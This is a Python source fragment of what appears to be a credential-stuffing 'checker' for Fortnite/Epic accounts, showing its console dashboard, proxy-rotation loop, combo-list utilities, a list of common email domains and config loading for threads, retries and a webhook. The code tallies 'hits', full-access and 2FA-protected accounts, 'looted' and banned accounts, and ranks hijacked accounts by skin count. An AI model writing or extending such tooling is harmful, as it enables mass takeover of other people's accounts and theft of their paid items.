                  {Fore.BLACK}██████{Fore.MAGENTA}╔╝{Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK}   ██{Fore.MAGENTA}║{Fore.BLACK}██{Fore.MAGENTA}║    {Fore.BLACK} ██{Fore.MAGENTA}║  {Fore.BLACK} ██{Fore.MAGENTA}║{Fore.BLACK}     ███████{Fore.MAGENTA}║{Fore.BLACK}█████{Fore.MAGENTA}╗{Fore.BLACK}  ██{Fore.MAGENTA}║    {Fore.BLACK} █████{Fore.MAGENTA}╔╝{Fore.BLACK} █████{Fore.MAGENTA}╗  {Fore.BLACK}██████{Fore.MAGENTA}╔╝
                  {Fore.BLACK}██{Fore.MAGENTA}╔══{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║  {Fore.BLACK} ██{Fore.MAGENTA}║{Fore.BLACK}██{Fore.MAGENTA}║    {Fore.BLACK} ██{Fore.MAGENTA}║   {Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK}     ██{Fore.MAGENTA}╔══{Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK}██{Fore.MAGENTA}╔══╝  {Fore.BLACK}██{Fore.MAGENTA}║     {Fore.BLACK}██{Fore.MAGENTA}╔═{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK} ██{Fore.MAGENTA}╔══╝ {Fore.BLACK} ██{Fore.MAGENTA}╔══{Fore.BLACK}██{Fore.MAGENTA}╗
                  {Fore.BLACK}██████{Fore.MAGENTA}╔╝╚{Fore.BLACK}██████{Fore.MAGENTA}╔╝{Fore.BLACK}███████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║   ╚{Fore.BLACK}██████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║  {Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK}███████{Fore.MAGENTA}╗╚{Fore.BLACK}██████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║ {Fore.BLACK} ██{Fore.MAGENTA}╗{Fore.BLACK}███████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║  {Fore.BLACK}██{Fore.MAGENTA}║
                  {Fore.MAGENTA}╚═════╝  ╚═════╝ ╚══════╝╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

'''
                    system('cls')
                    print(logo_colored)
                    print(f'                                                  {Fore.MAGENTA}          [{Counter.checkedpercent:.2f}%]\n\n')
                    zeroskins = 0
                    oneplus = 0
                    tenplus = 0
                    fiftyplus = 0
                    onehundredplus = 0
                    twohundredplus = 0
                    threehundredplus = 0
                    exclusivee = 0
                    maybefa = 0
                    nfa = 0
                    for data in Counter.skins_data:
                        fullAccess = data["fullAccess"]
                        total_skins = data["total_skins"]
                        exclusive = data['exclusive']
                        if fullAccess.lower() == 'fa':
                            maybefa += 1
                        else:
                            nfa +=1
                        if exclusive:
                            exclusivee+=1
                        if total_skins >= 300:
                            threehundredplus += 1
                        elif total_skins >= 200:
                            twohundredplus += 1
                        elif total_skins >= 100:
                            onehundredplus += 1
                        elif total_skins >= 50:
                            fiftyplus += 1
                        elif total_skins >= 10:
                            tenplus += 1
                        elif total_skins >= 1:
                            oneplus += 1
                        elif total_skins == 0:
                            zeroskins += 1
                    symbo4 = f'{Fore.WHITE}[{Fore.GREEN}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symbop = f'{Fore.WHITE}[{Fore.LIGHTMAGENTA_EX}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symbol = f'{Fore.WHITE}[{Fore.CYAN}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symbo1 = f'{Fore.WHITE}[{Fore.BLUE}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symbo2 = f'{Fore.WHITE}[{Fore.WHITE}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symbo3 = f'{Fore.WHITE}[{Fore.RED}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symb4o = f'{Fore.WHITE}[{Fore.MAGENTA}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symb5o = f'{Fore.WHITE}[{Fore.YELLOW}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symbo5 = f'{Fore.WHITE}[{Fore.LIGHTGREEN_EX}+{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symbo6 = f'{Fore.WHITE}[{Fore.LIGHTRED_EX}-{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symbo7 = f'{Fore.WHITE}[{Fore.LIGHTYELLOW_EX}/{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    symbo8 = f'{Fore.WHITE}[{Fore.LIGHTBLACK_EX}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                    bad = Counter.bad + Counter.mshit + Counter.custom + Counter.locked
                    if not Counter.brute:
                        result = (
                            f'                           {Fore.MAGENTA}  ------CHECKER-------     -------STATS-------      ------SKINS------\n'
                            f'                              {symbo5} Hits      {Counter.hits + Counter.fnban:<8}  {symbo4} NFA         {nfa:<8}  {symbop} 300+     {threehundredplus:<8}\n'
                            f'                              {symbo6} Fails     {bad:<8}  {symbol} FA          {maybefa:<8}  {symbop} 200+     {twohundredplus:<8}\n'
                            f'                              {symbo7} CPM       {Counter.cpm:<8}  {symbo2} STW         {Counter.stw:<8}  {symbop} 100+     {onehundredplus:<8}\n'
                            f'                             {Fore.MAGENTA}--------------------     {symbo3} Rares       {exclusivee:<8}  {symbop} 50+      {fiftyplus:<8}\n'
                            f'                                                      {symb4o} Ogs         {Counter.og:<8}  {symbop} 10+      {tenplus:<8}\n'
                            f'                                                      {symbo1} Headless    {Counter.headless:<8}  {symbop} 1+       {oneplus:<8}\n'
                            f'                                                      {symb5o} Epic 2FA    {Counter.epic2fa:<8}  {symbop} 0        {zeroskins:<8}\n'
                            f'                                                      {symbo8} Banned      {Counter.fnban:<8} {Fore.MAGENTA}-----------------\n'
                            f'                                                      {Fore.MAGENTA}-------------------'
                        )
                    else:
                        result = (
                            f'                                       {Fore.MAGENTA}  ------CHECKER-------     -------STATS-------\n'
                            f'                                          {symbo5} Hits      {Counter.hits:<8}  {symbo4} Locked    {Counter.locked:<8}\n'
                            f'                                          {symbo6} Fails     {bad:<8}  {symbol} 2FA       {Counter.custom:<8}\n'
                            f'                                          {symbo7} CPM       {Counter.cpm:<8}  {symbo2} Invalid   {Counter.bad:<8}\n'
                            f'                                         {Fore.MAGENTA}--------------------     -------------------'
                        )

                    print(result)
                elif self.cuitype == 'nexus':
                    logo_colored = [
                                            f"                  {Fore.RED}██████{Fore.LIGHTRED_EX}╗{Fore.RED}  ██████{Fore.LIGHTRED_EX}╗{Fore.RED} ██{Fore.LIGHTRED_EX}╗{Fore.RED}  ████████{Fore.LIGHTRED_EX}╗{Fore.RED} ██████{Fore.LIGHTRED_EX}╗{Fore.RED}██{Fore.LIGHTRED_EX}╗{Fore.RED}  ██{Fore.LIGHTRED_EX}╗{Fore.RED}███████{Fore.LIGHTRED_EX}╗{Fore.RED} ██████{Fore.LIGHTRED_EX}╗{Fore.RED}██{Fore.LIGHTRED_EX}╗{Fore.RED}  ██{Fore.LIGHTRED_EX}╗{Fore.RED}███████{Fore.LIGHTRED_EX}╗{Fore.RED}██████{Fore.LIGHTRED_EX}╗",
                                            f"                  {Fore.RED}██{Fore.LIGHTRED_EX}╔══{Fore.RED}██{Fore.LIGHTRED_EX}╗{Fore.RED}██{Fore.LIGHTRED_EX}╔═══{Fore.RED}██{Fore.LIGHTRED_EX}╗{Fore.RED}██{Fore.LIGHTRED_EX}║  ╚══{Fore.RED}██{Fore.LIGHTRED_EX}╔══╝{Fore.RED}██{Fore.LIGHTRED_EX}╔════╝{Fore.RED}██{Fore.LIGHTRED_EX}║{Fore.RED}  ██{Fore.LIGHTRED_EX}║{Fore.RED}██{Fore.LIGHTRED_EX}╔════╝{Fore.RED}██{Fore.LIGHTRED_EX}╔════╝{Fore.RED}██{Fore.LIGHTRED_EX}║{Fore.RED} ██{Fore.LIGHTRED_EX}╔╝{Fore.RED}██{Fore.LIGHTRED_EX}╔════╝{Fore.RED}██{Fore.LIGHTRED_EX}╔══{Fore.RED}██{Fore.LIGHTRED_EX}╗",
                                            f"                  {Fore.RED}██████{Fore.LIGHTRED_EX}╔╝{Fore.RED}██{Fore.LIGHTRED_EX}║{Fore.RED}   ██{Fore.LIGHTRED_EX}║{Fore.RED}██{Fore.LIGHTRED_EX}║    {Fore.RED} ██{Fore.LIGHTRED_EX}║  {Fore.RED} ██{Fore.LIGHTRED_EX}║{Fore.RED}     ███████{Fore.LIGHTRED_EX}║{Fore.RED}█████{Fore.LIGHTRED_EX}╗{Fore.RED}  ██{Fore.LIGHTRED_EX}║    {Fore.RED} █████{Fore.LIGHTRED_EX}╔╝{Fore.RED} █████{Fore.LIGHTRED_EX}╗  {Fore.RED}██████{Fore.LIGHTRED_EX}╔╝",
                                            f"                  {Fore.LIGHTRED_EX}██{Fore.RED}╔══{Fore.LIGHTRED_EX}██{Fore.RED}╗{Fore.LIGHTRED_EX}██{Fore.RED}║  {Fore.LIGHTRED_EX} ██{Fore.RED}║{Fore.LIGHTRED_EX}██{Fore.RED}║    {Fore.LIGHTRED_EX} ██{Fore.RED}║   {Fore.LIGHTRED_EX}██{Fore.RED}║{Fore.LIGHTRED_EX}     ██{Fore.RED}╔══{Fore.LIGHTRED_EX}██{Fore.RED}║{Fore.LIGHTRED_EX}██{Fore.RED}╔══╝  {Fore.LIGHTRED_EX}██{Fore.RED}║     {Fore.LIGHTRED_EX}██{Fore.RED}╔═{Fore.LIGHTRED_EX}██{Fore.RED}╗{Fore.LIGHTRED_EX} ██{Fore.RED}╔══╝ {Fore.LIGHTRED_EX} ██{Fore.RED}╔══{Fore.LIGHTRED_EX}██{Fore.RED}╗",
                                            f"                  {Fore.LIGHTRED_EX}██████{Fore.RED}╔╝╚{Fore.LIGHTRED_EX}██████{Fore.RED}╔╝{Fore.LIGHTRED_EX}███████{Fore.RED}╗{Fore.LIGHTRED_EX}██{Fore.RED}║   ╚{Fore.LIGHTRED_EX}██████{Fore.RED}╗{Fore.LIGHTRED_EX}██{Fore.RED}║  {Fore.LIGHTRED_EX}██{Fore.RED}║{Fore.LIGHTRED_EX}███████{Fore.RED}╗╚{Fore.LIGHTRED_EX}██████{Fore.RED}╗{Fore.LIGHTRED_EX}██{Fore.RED}║ {Fore.LIGHTRED_EX} ██{Fore.RED}╗{Fore.LIGHTRED_EX}███████{Fore.RED}╗{Fore.LIGHTRED_EX}██{Fore.RED}║  {Fore.LIGHTRED_EX}██{Fore.RED}║",
                                            f"                  {Fore.RED}╚═════╝  ╚═════╝ ╚══════╝╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝",
                    ]
                    total_chars = sum(line.count('█') + line.count('╔') + line.count('╗') + line.count('╚') + line.count('═') + line.count('║') for line in logo_colored)
                    chars_to_color = total_chars if Counter.checkedpercent >= 100 else int(round(total_chars * Counter.checkedpercent / 100))

                    colored_logo = ""
                    colored_count = 0

                    for line in logo_colored:
                                            colored_line = ""
                                            for char in line:
                                                if char in '█╔╗═║╚' and colored_count < chars_to_color:
                                                    colored_line += char  
                                                    colored_count += 1
                                                else:
                                                    if char in '█╔╗═║╚':
                                                        colored_line += Fore.LIGHTWHITE_EX + char + colorama.Style.RESET_ALL
                                                    else:
                                                        colored_line += char 
                                            colored_logo += colored_line + "\n"
                    system('cls')
                    print(colored_logo)
                    zeroskins = 0
                    oneplus = 0
                    tenplus = 0
                    fiftyplus = 0
                    onehundredplus = 0
                    twohundredplus = 0
                    threehundredplus = 0
                    exclusivee = 0
                    maybefa = 0
                    for data in Counter.skins_data:
                        fullAccess = data["fullAccess"]
                        total_skins = data["total_skins"]
                        exclusive = data['exclusive']
                        if fullAccess.lower() == 'fa':
                            maybefa += 1
                        if exclusive:
                            exclusivee+=1
                        elif 300 <= total_skins:
                            threehundredplus+=1
                        elif 200 <= total_skins <= 299:
                            twohundredplus+=1
                        elif 100 <= total_skins <= 199:
                            onehundredplus+=1
                        elif 50 <= total_skins <= 99:
                            fiftyplus+=1
                        elif 10 <= total_skins <= 49:
                            tenplus+=1
                        elif 1 <= total_skins <= 9:
                            oneplus+=1
                        elif total_skins == 0:
                            zeroskins +=1
                    def print_formatted(text, value1, value2, value3=None, color1=Fore.WHITE, color2=Fore.WHITE):
                        if value3 is not None:
                            print(f"{color1}{text.format(value1, value2, value3)}{color2}")
                        else:
                            print(f"{color1}{text.format(value1, value2)}{color2}")

                    checked = int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked
                    print_formatted("                                              [{1}]  Progress      [{0}/{2}]", checked, ">>", len(self.accounts), Fore.RED, Fore.WHITE)
                    print()
                    print_formatted("                                              [{1}]  Hits          [{0}]", Counter.hits, ">>", color1=Fore.GREEN)
                    print_formatted("                                              [{1}]  2fa           [{0}]", Counter.custom, ">>", color1=Fore.LIGHTYELLOW_EX)
                    print_formatted("                                              [{1}]  Epic 2fa      [{0}]", Counter.epic2fa, ">>", color1=Fore.YELLOW)
                    print_formatted("                                              [{1}]  Maybe FA      [{0}]", maybefa, ">>", color1=Fore.LIGHTMAGENTA_EX)
                    print_formatted("                                              [{1}]  Looted        [{0}]", Counter.locked, ">>", color1=Fore.LIGHTBLACK_EX)
                    print_formatted("                                              [{1}]  Fails         [{0}]", Counter.bad, ">>", color1=Fore.LIGHTRED_EX)
                    print()
                    print_formatted("                                              [{1}]  300+ Skins    [{0}]", threehundredplus, ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  200+ Skins    [{0}]", twohundredplus, ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  100+ Skins    [{0}]", onehundredplus, ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  50+  Skins    [{0}]", fiftyplus, ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  10+  Skins    [{0}]", tenplus, ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  1+   Skins    [{0}]", oneplus, ">>", color1=Fore.RED)
                    print_formatted("                                              [{1}]  0    Skins    [{0}]", zeroskins, ">>", color1=Fore.RED)

                    print()
                    print_formatted("                                              [{1}]  STW           [{0}]", Counter.stw, ">>", color1=Fore.YELLOW)
                    print_formatted("                                              [{1}]  OGS           [{0}]", Counter.og, ">>", color1=Fore.MAGENTA)
                    print_formatted("                                              [{1}]  Rares         [{0}]", exclusivee, ">>", color1=Fore.CYAN)
                    print()
                    print_formatted("                                              [{1}]  Retries       [{0}]", Counter.retries, ">>", color1=Fore.LIGHTYELLOW_EX)
                    print_formatted("                                              [{1}]  CPM           [{0}]", Counter.cpm, ">>", color1=Fore.WHITE)

            except Exception as e:
                print(f"{Fore.RED}{e}")
    def Timeused(self):
        from time import time
        return strftime("%H:%M:%S", gmtime(time() - self.start_time))

    def get_option(self, option):
        options = {
            1: self.password1,
            2: self.generaledits,
            3: self.domain_sorter,
            4: self.domain_adder,
            5: self.domain,
            6: self.split,
            8: self.names,
            9: self.emails,
            10: self.combo,
            11: self.sort,
            12: self.filter,
            13: self.domainchanger,
            14: self.splitter


        }
        options[int(option)]()
    

    def proxyupdateder(self):
        while True:
            if not self.proxyapi:
                read_files = glob('proxies/*.txt')
                self.proxylist = []
                for file in read_files:
                    proxylistt = open(file, 'r', encoding='u8',
                                      errors='ignore').read().split('\n')
                    for line in proxylistt:
                        self.proxylist.append(f'{line}')
                    print(
                        f'{Fore.CYAN}[Proxy] Proxies Refreshed there are now {len(self.proxylist)}')
                    sleep(60)
                    continue

    @staticmethod
    def lisr():
        lisr = ['@gmail.com', '@yahoo.com', '@hotmail.com', '@aol.com', '@hotmail.co.uk', '@hotmail.fr', '@msn.com',
                '@yahoo.fr', '@wanadoo.fr', '@orange.fr', '@comcast.net', '@yahoo.co.uk', '@yahoo.com.br',
                '@yahoo.co.in', '@live.com', '@rediffmail.com', '@free.fr', '@gmx.de', '@web.de', '@yandex.ru',
                '@ymail.com', '@libero.it', '@outlook.com', '@uol.com.br', '@bol.com.br', '@mail.ru', '@cox.net',
                '@hotmail.it', '@sbcglobal.net', '@sfr.fr', '@live.fr', '@verizon.net', '@live.co.uk',
                '@googlemail.com', '@yahoo.es', '@ig.com.br', '@live.nl', '@bigpond.com', '@terra.com.br', '@yahoo.it',
                '@neuf.fr', '@yahoo.de', '@alice.it', '@rocketmail.com', '@att.net', '@laposte.net', '@facebook.com',
                '@bellsouth.net', '@yahoo.in', '@hotmail.es', '@charter.net', '@yahoo.ca', '@yahoo.com.au',
                '@rambler.ru', '@hotmail.de', '@tiscali.it', '@shaw.ca0.1%', '@yahoo.co.jp', '@sky.com',
                '@earthlink.net', '@optonline.net', '@freenet.de', '@t-online.de', '@aliceadsl.fr', '@virgilio.it',
                '@home.nl', '@qq.com', '@telenet.be', '@me.com', '@yahoo.com.ar', '@tiscali.co.uk', '@yahoo.com.mx',
                '@voila.fr', '@gmx.net', '@mail.com', '@planet.nl', '@tin.it', '@live.it', '@ntlworld.com', '@arcor.de',
                '@yahoo.co.id', '@frontiernet.net', '@hetnet.nl', '@live.com.au', '@yahoo.com.sg', '@zonnet.nl',
                '@club-internet.fr', '@juno.com', '@optusnet.com.au', '@blueyonder.co.uk', '@bluewin.ch', '@skynet.be',
                '@sympatico.ca', '@windstream.net', '@mac.com', '@centurytel.net', '@chello.nl', '@live.ca', '@aim.com',
                '@bigpond.net.au']
        return lisr

    def scrambled(self, ob):
        dest = ob[:]
        shuffle(dest)
        return dest

class Checker:
    def exit_program(type):
        if Counter.Checking: 
            Checker.save_lines()
    def save_lines():
        print(f"    [{Fore.CYAN}Saving Remaining Lines{Fore.RESET}]")
        unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
        with open(f"{unix} Remaining_lines.txt","w", encoding='utf8') as file: file.write("\n".join(Counter.remaining))
        sleep(1)
    try:
        printbadd = bool(config['checker']['print_fail'])
        printms = bool(config['checker']['print_ms_hit'])
        retries = int(config['checker']['retries'])
        timeout = int(config['checker']['timeout']) / 1000
        threads = int(config['checker']['threads'])
        save_bad = bool(config['checker']['save_bad'])
        mode = str(config['checker']['display_mode'])
        importFromFile = bool(config['checker']['import_from_file'])


        class webhook:
            webhooky = bool(config['checker']['webhook']['Webhook'])
            webhookid = str(config['checker']['webhook']['WebhookID'])


        class Proxy:
            proxy = bool(config['checker']['proxy']['proxy'])
            type = str(config['checker']['proxy']['proxy_type'])
            proxy_api = bool(config['checker']['proxy']['proxy_api'])
            proxy_api_link = str(config['checker']['proxy']['api_link'])

    except KeyError:
        print(f'{Fore.CYAN}Config is outdated, deleting...')
        os.remove('config/config.yml')
        os.rmdir('config')
        print(f'{Fore.GREEN}Deleted')
        print(f'{Fore.CYAN}Please restart the checker\n')
        exit()


if __name__ == '__main__':
    from sys import platform
    if platform == "win32":
        win32api.SetConsoleCtrlHandler(Checker.exit_program, True)
    else:
        pass
    agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36'
    from glob import glob
    from re import findall
    from threading import Thread, Lock
    lock = Lock()
    levelmp = compilee(r'>Level (.*)</b>')
    rankmp = compilee(r'class=\"www-mp-rank\".*>(.*)</span>')
    something = compilee(r'class=\"stat-value \".*>(.*)</span>')
    Main()
